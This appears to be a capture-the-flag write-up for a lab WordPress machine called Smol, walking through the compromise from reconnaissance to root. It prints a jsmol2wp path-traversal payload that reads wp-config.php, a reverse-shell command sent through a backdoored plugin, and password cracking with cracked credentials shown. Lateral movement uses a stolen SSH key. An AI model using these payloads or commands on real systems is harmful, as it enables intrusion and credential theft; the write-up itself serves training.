# Oveview
<img width="524" height="154" alt="Screenshot_2025-09-26_22-05-35" src="https://github.com/user-attachments/assets/aad6b653-25be-4d68-b39f-46517fb07be0" />

```text
At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem.
The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches.
Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.

Quick Tips: Do you know that on computers without GPU like the AttackBox, John The Ripper is faster than Hashcat?
```
# Reconnaisance
Kick off with tcp `nmap` scan
```
nmap -T4 -vvv -A -O -sV 10.201.91.177
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3e:aa:7c:8d:8f:27:4e:bb:2a:04:2c:40:40:c2:64:9b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0sZAAu6ugPIGmCWur5XGOBoQa8A/IUOeyiOHnYIxvU5smHQQ5JFtcayJTFbpssCVXAHvx8SD1z1QguC5o+4pN8XJNyBfKCvJtP5mA2fOJ7P2R9fiPyRe+gVz37GuOObDqtozpqq9n3AXUgUygYh3N/MrFB8BH2S8HSIjMg5nR+Ed1yWC16zGfe5VHUN9Isw/km+jQ973Zb+SsbT+atg/hVYKTs75k9NBCT4wGpzwwPkQFZcodBvtxGjhOSMgO3XVfhvMsZmJNlpS8XzQ5ervX8RxCFJpfUriPn8NaOFi/ha82CUyqeuKwA5V9yaA8+GcM3L/VEaY1icURIHBb3LoYMKWqoX9dLFrChANrJt9wzDl+TigAQA9+XYNkW2NZLuC2iCfjSpG4cIoBNJrGPfJPex3fobGUR/Nte8H5OJLpbwXO5jFaX3Po06tIqKCIB5sciFZyUIoq8Us5zdww+VE6ClTHVJCSb50hNPLee86kR8LoYfaGyKYiJHd/9H3z+K0=
|   256 9f:d3:1b:41:c1:67:ac:32:bf:52:66:fd:71:29:b7:b3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIxE8rcRi2GHKSiN1oO+53dQJSHQnkuZh89I3ljpGZn6F73FSQpDANct5bOVr69gmEkRdIRrtj3+Nl+llKfeSbQ=
|   256 38:67:22:ed:08:85:c9:b8:7f:10:34:0a:6e:da:9c:8d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIXLkyaAACT0h5z4DLhVV/EtjH7WSLCGJmgqrG/GrHGH
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
...
```
There are 2 open ports `22-ssh` and `80-http`. 

Let's have a look at the target site. But first, the previous `nmap` result showed that the target has a domain name, which means I need to add to my host in order to gain access.
<img width="1910" height="878" alt="Screenshot_2025-09-26_22-16-15" src="https://github.com/user-attachments/assets/25f4d8de-8d2b-4c97-8c41-432a43a84afb" />

```
sudo nano /etc/hosts
```
<img width="1919" height="880" alt="Screenshot_2025-09-26_22-19-45" src="https://github.com/user-attachments/assets/4dc811a6-d517-4d7a-acb8-375a7ac92f6d" />

<img width="1920" height="805" alt="Screenshot_2025-09-26_22-20-02" src="https://github.com/user-attachments/assets/b04eb4f1-0c8a-4c89-b969-1e50ff018359" />
 
The site is about advertising CTF called `AnotherCTF`, the page source look clean to me, which has no exposed sensitive data.
I am going to use `nmap` again but this times I use `lue-script` to find vulnerability. Here is the result:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=www.smol.thm
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://www.smol.thm:80/wp-content/plugins/jsmol2wp/JSmol.min.nojq.js?ver=14.1.7_2014.06.09
|     Form id: __jsmolform__
|_    Form action: 
| http-sql-injection: 
|   Possible sqli for queries:
|     http://www.smol.thm:80/wp-content/plugins/jsmol2wp/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://www.smol.thm:80/wp-content/plugins/jsmol2wp/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://www.smol.thm:80/wp-content/plugins/jsmol2wp/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://www.smol.thm:80/wp-content/plugins/jsmol2wp/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://www.smol.thm:80/wp-includes/js/jquery/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://www.smol.thm:80/wp-includes/js/jquery/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://www.smol.thm:80/wp-includes/js/jquery/?C=M%3BO%3DA%27%20OR%20sqlspider
|_    http://www.smol.thm:80/wp-includes/js/jquery/?C=D%3BO%3DA%27%20OR%20sqlspider
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 6.7.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
| http-wordpress-users: 
| Username found: admin
| Username found: wp
| Username found: think
| Username found: gege
| Username found: diego
| Username found: xavi
```

I did not expect to enumerate so much information after this scan. Next, I properly use either `ffuf` or `gobuster` to look for hidden endpoints.
```
gobuster dir -u 'http://www.smol.thm/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
...
/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
/server-status        (Status: 403) [Size: 277]
```
That is what `gobuster` can help me at the moment.
While accessing the folder `wp-admin`, a login portal just appeared and I attempted to enter with default credential `admin:password`
![Screenshot_2025-09-27_16_35_00](https://github.com/user-attachments/assets/a0a9424e-901e-43e8-afa9-00cf49bdaa36)


So I think that I need bruteforce to find the password because I already got the username. Waiting for the long time but I did not get any useful results which means I can't just easily break it.
I tried to do more fuzzing endpoints for `wp-inludes` and got this result
```
/assets               (Status: 301) [Size: 325] [--> http://www.smol.thm/wp-includes/assets/]
/images               (Status: 301) [Size: 325] [--> http://www.smol.thm/wp-includes/images/]
/css                  (Status: 301) [Size: 322] [--> http://www.smol.thm/wp-includes/css/]
/js                   (Status: 301) [Size: 321] [--> http://www.smol.thm/wp-includes/js/]
/blocks               (Status: 301) [Size: 325] [--> http://www.smol.thm/wp-includes/blocks/]
/widgets              (Status: 301) [Size: 326] [--> http://www.smol.thm/wp-includes/widgets/]
/fonts                (Status: 301) [Size: 324] [--> http://www.smol.thm/wp-includes/fonts/]
/customize            (Status: 301) [Size: 328] [--> http://www.smol.thm/wp-includes/customize/]
/certificates         (Status: 301) [Size: 331] [--> http://www.smol.thm/wp-includes/certificates/]
/Text                 (Status: 301) [Size: 323] [--> http://www.smol.thm/wp-includes/Text/]
/sitemaps             (Status: 301) [Size: 327] [--> http://www.smol.thm/wp-includes/sitemaps/]
/l10n                 (Status: 301) [Size: 323] [--> http://www.smol.thm/wp-includes/l10n/]
/Requests             (Status: 301) [Size: 327] [--> http://www.smol.thm/wp-includes/Requests/]
```
`wp-content`
```
plugins                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 339ms]
upgrade                 [Status: 200, Size: 776, Words: 52, Lines: 16, Duration: 349ms]
                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 335ms]
```
Nothing at all, I am a bit stuck at there. I searched for more things to do and found that there is another tool specifically is used for gathering information from WordPress which is `wpscan`, a default tool on kali linux
```
wpscan --url http://www.smol.thm
...
[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

```
Remember the main page included some vulnerabilities, I assume that those would be the vulnerabilities of this server. So I tried to search for this un usual endpoint after `wpscan`
## JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```
Here is the reference [link](https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/)
and it works, that is crazy.
<img width="1599" height="878" alt="Screenshot_2025-09-28_23-02-18" src="https://github.com/user-attachments/assets/aebb6d62-6643-4375-ad8f-a12d1d75b2f9" />

So I got database credential, try to login to the login portal. Successfully
<img width="1920" height="1002" alt="Screenshot_2025-09-30_20-48-10" src="https://github.com/user-attachments/assets/89cde7d8-c3cd-43ca-939a-cc1409c9750c" />

Inside the `pages` section, `Webmaster Tasks`, I came across this
<img width="983" height="50" alt="Screenshot_2025-09-30_21-17-17" src="https://github.com/user-attachments/assets/1d6b10ce-0d9e-4100-a161-8fd6abbdd6d8" />
this tells me about the file called `hello.php` in side the `/plugins` folder.

Based on the previous payload, I am at `wp-content/plugins/jsmol2wp/php/`, so I have to move back two directory to read hello.php
```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```
<img width="1124" height="268" alt="Screenshot_2025-09-30_21-23-24" src="https://github.com/user-attachments/assets/542deb00-3ac3-4d9f-b749-c0799f52f7d9" />
I noticed this function is kinda suspicious because it contains a encoded string. I use cyberchef to decode it

<img width="1536" height="591" alt="Screenshot_2025-09-30_21-23-33" src="https://github.com/user-attachments/assets/63777634-ad54-43d8-aa16-73d5b18cad5f" />
then got something is kinda random "\143\155\x64" and "\143\x6d\144"
Using this [tool](https://malwaredecoder.quttera.com/) to decode 
<img width="308" height="497" alt="Screenshot_2025-09-30_21-31-54" src="https://github.com/user-attachments/assets/44af8efb-106d-48c8-881d-d1bcbe17f882" />

which means that, everything I would type on that will be converted into command for system. How do I know that where the hello dolly function actually is?

<img width="1756" height="413" alt="Screenshot_2025-09-30_21-35-38" src="https://github.com/user-attachments/assets/9f3f7b84-ea4c-46f6-8fc0-4f301c6d828f" />
Pay a little attention to the top right of the task bar, I saw the lyric, belong to `hello.php`

First, I need to set the listenter on my host machine
```
nc -lnvp 1111
```
Then this is the payload
```
busybox nc 10.23.99.113 1111 -e bash
```
Here is the full triggering phase
```
http://www.smol.thm/wp-admin/index.php?cmd=busybox nc 10.23.99.113 1111 -e bash
```
Then I successfully got a shell

## Interactive shell
I have one python script which can make this reverse shell into interactive shell. But I need to check whether this server has python or not
<img width="246" height="55" alt="Screenshot_2025-09-30_21-53-03" src="https://github.com/user-attachments/assets/1030a991-cd24-4d61-9b57-db1602dfef2a" />

Yes it does
```
python3 -c "impot pty;pty.spawn('/bin/bash')"
```
And the terminal should look like this
<img width="484" height="33" alt="Screenshot_2025-09-30_21-56-24" src="https://github.com/user-attachments/assets/eecd4691-ffd2-492e-aa48-1304158089b4" />

Let's keep digging for further information. There is one folder which I need to check first is `/opt/` which contains a file `wp_backup.sql`, and `/tmp` is clear so have a look at th `wp_backup.sql`
Well, I need for move the file to my host for convenience.

On the target
```
python3 -m http.server 9000
```
On my host
```
wget http://<MACHINE_IP>:9000/wp.backup.sql
```
<img width="978" height="117" alt="Screenshot_2025-09-30_22-06-36" src="https://github.com/user-attachments/assets/424bab28-4936-46a6-b8be-ca5a12b5da8b" />
I reckon that the third value in each list is the password for each user. So I need to crack them since they are in hashed format

```
john --wordlist=<WORDLIST PATH> <HASHED FILE>
```
<img width="879" height="213" alt="Screenshot_2025-09-30_22-39-05" src="https://github.com/user-attachments/assets/58ea7f34-1779-4943-b607-3ce1702efe41" />
<img width="834" height="192" alt="Screenshot_2025-09-30_22-32-03" src="https://github.com/user-attachments/assets/6563bd13-a953-4b47-ae24-d8bde215d5b9" />

Both `gege` and `diego` are crackable, I coudn't crack `think` and ` xavi`
```
gege: hero_gege@hotmail.com
diego: sandiegocalifornia
```

<img width="555" height="147" alt="Screenshot_2025-10-01_08-34-57" src="https://github.com/user-attachments/assets/76ad87b3-3a71-47a2-9c47-f8473c011e0d" />
I failed to switch user into `gege`, I confused that even the password in the database is wrong, what should it be the password? However, I successfully switch user into `diego`

<img width="477" height="133" alt="Screenshot_2025-10-01_08-35-29" src="https://github.com/user-attachments/assets/9abf6220-9723-485e-9d54-01d181bffa19" />
It's time to retrieve the flag

# Privilege Escalation
I need to import linpeas from my machine for detailed scanning. So I just need to set up a listener in the folder containing linpeas
```
python3 -m http.server 1234
```
Then using `wget` to import linpeas
```
wget http://<MACHINE IP>:1234/linpeas.sh
```
The thing is where should I import to? Folder `/tmp` my favorite folder which allow me to change mode permission into executable. Now, run linpeas
```
chmod +x linpeas.sh
./linpeas.sh
```

After observing the output, I got this

<img width="418" height="344" alt="Screenshot_2025-10-01_08-53-16" src="https://github.com/user-attachments/assets/f42d0d8f-c3ce-4957-918e-31a0834d863d" />
Well, I can actually read the keys which contain private key to get access to server as user `think`
<img width="373" height="55" alt="Screenshot_2025-10-01_09-07-54" src="https://github.com/user-attachments/assets/eccd4840-47df-4bb0-81b3-b375380bb07f" />

<img width="761" height="836" alt="Screenshot_2025-10-01_09-03-23" src="https://github.com/user-attachments/assets/248c5e4f-bfcf-4c69-aa10-78cefc50829a" />
Then I just create a file to contain the private key. Boom! I'm `think` user now

<img width="649" height="729" alt="Screenshot_2025-10-01_09-05-33" src="https://github.com/user-attachments/assets/f54b3605-ff64-4c2f-b17e-1c6a8cd60dfc" />
So I probably do the same thing with this user as well, import linpeas and scan for something interesting (Because I notiec that inside folder `/tmp` of this user has some executable files which is different from `diego`)

<img width="484" height="89" alt="Screenshot_2025-10-01_09-25-42" src="https://github.com/user-attachments/assets/2a4f82bf-0c33-453a-adae-fc98b4d39e1a" />
I need to have a look at these uncommon files.

If I run this, it will leverage my permission to user `gege`
<img width="597" height="146" alt="Screenshot_2025-10-01_09-29-25" src="https://github.com/user-attachments/assets/776370b8-83cc-40a2-82bd-47f7b9ed4feb" />

By simple type
```
su gege
```
Now, I am `gege`, I came across a protected archive there, so transfer this archive into my machine for cracking process.

<img width="760" height="350" alt="Screenshot_2025-10-01_09-37-31" src="https://github.com/user-attachments/assets/38825cd7-c893-47f2-87ad-7a5f081c1632" />
<img width="725" height="164" alt="Screenshot_2025-10-01_09-38-54" src="https://github.com/user-attachments/assets/8b10d7e1-23fb-452f-be00-5ea5b96f3c0a" />

Wait, is the password identical to the last one I crack before? So I need to unzip the archive to read some confidential information I reckon. And I found `wp_config.php`.
There are a lot of files to read, but luckily I found `wp-config.php` which contain user `xavi` credential
<img width="630" height="165" alt="Screenshot_2025-10-01_09-45-08" src="https://github.com/user-attachments/assets/12cf7c85-b88b-4614-a734-0d04a06f569f" />

Becoming `xavi` in one second.
<img width="945" height="141" alt="Screenshot_2025-10-01_09-48-26" src="https://github.com/user-attachments/assets/f6edb929-c8bb-4d0f-acb4-f526a9480531" />

How easy it is, since xavi has all command permisison on smol, which means that from `xavi` I could turn into `root` faster then I got the final flag. what an exciting journey
<img width="572" height="256" alt="Screenshot_2025-10-01_09-51-09" src="https://github.com/user-attachments/assets/c1ea44d6-3598-47c2-825e-449bfa54bcfe" />

Happy Hacking!!!
